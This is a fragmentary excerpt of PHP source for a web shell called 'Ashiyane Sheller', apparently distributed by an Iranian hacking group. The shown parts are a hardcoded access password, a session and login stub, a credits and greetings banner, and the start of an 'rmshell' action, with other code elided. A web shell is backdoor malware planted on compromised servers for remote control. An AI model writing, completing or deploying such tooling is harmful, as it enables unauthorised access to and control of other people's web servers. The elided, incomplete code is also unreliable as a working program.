...
*/
$auth_pass = "ashshell"; // Put your password here.
@session_start();
function Login() {
    die("
...
echo "<style>#aboutus{background: #A81F1F}</style>";
        ...
        <img src="http://ashiyane.org/aboutus/images/logo2.png" /><br />
   		<span style="color:#F00;font-size:20px">ASHIYANE SHELLER</span><br />
                        <span style="font-size:19px">Developed By <a target="_blank" href="http://ashiyane.org/forums/member.php?1281761">Mahdi.Hidden</a></span><br />
                        <span style="font-size:19px">Styled By <a target="_blank" href="http://ashiyane.org/forums/member.php?1333420-AlirezA">Alireza</a></span><br />

        <span>Greetings  : Behrooz_Ice, C4T, Alireza, Hror, Milad Hacking, ACC3SS, T3rm!nat0r5, Alireza Attacker, H_SQLI EMpiRe, .NetRemoting, Spoofer, spoof, All Ashiyane Members And Madleets.</span><br />
        <span>Our Residence: <a href="http://ashiyane.org" target="_blank">Ashiyane.org</a><br />
        <span><br>Ashiyane Digital Security Team</span><br />
                    </center>
        <?php
	}
	if($action=="rmshell"){
